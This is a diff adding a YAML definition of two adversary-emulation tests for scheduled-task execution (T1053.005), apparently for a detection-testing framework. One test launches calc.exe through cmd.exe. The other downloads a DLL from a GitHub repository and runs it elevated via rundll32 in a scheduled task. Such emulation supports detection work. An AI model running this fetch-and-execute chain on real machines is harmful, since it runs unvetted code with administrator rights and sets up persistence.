@@ -1,0 +1,50 @@
+attack_technique: T1053.005
+display_name: Schtasks.exe_executing_with_suspicious_process_names_in_cli
+
+atomic_tests:
+- name: Schtasks.exe runs cmd.exe /c
+  auto_generated_guid: 83bfea22-1e23-4a8e-9df4-95c29260304f
+  description: |
+    This test will create a Scheduled task that will run cmd with the /c swtich to execute calc.exe
+
+  supported_platforms:
+    - windows
+    
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      SCHTASKS /Create /SC ONCE /TN testtask /TR "C:\Windows\System32\cmd.exe /c calc.exe" /ST 20:10
+      SCHTASKS /RUN /TN testtask
+    cleanup_command: |
+      SCHTASKS /Delete /TN testtask /F
+- name: Schtasks.exe runs rundll32.exe
+  auto_generated_guid: 33f38796-8e7a-4431-b194-98835db33bee
+  description: |
+    This test will add a command rundll32.exe meow.dll, to a Scheduled task and run this scheduled task
+
+  supported_platforms:
+    - windows
+  
+  input_arguments:
+    dll_file:
+      description: the dll file to run
+      type: path
+      default: PathToAtomicsFolder\Schtasks.exe_executing_with_suspicious_process_names_in_cli\src\meow.dll
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Test dll must exist on disk at specified location (#{dll_file})
+    prereq_command: if (Test-Path "#{dll_file}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path "#{dll_file}") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/ahmedfarou22/Penetration-Testing-Reports/raw/main/meow.dll" -OutFile "#{dll_file}"
+  
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      SCHTASKS /Create /SC ONCE /TN testtasktwo /TR "C:\Windows\System32\rundll32.exe #{dll_file},main " /ST 20:10
+      SCHTASKS /RUN /TN testtasktwo
+    cleanup_command: |
+      SCHTASKS /Delete /TN testtasktwo /F
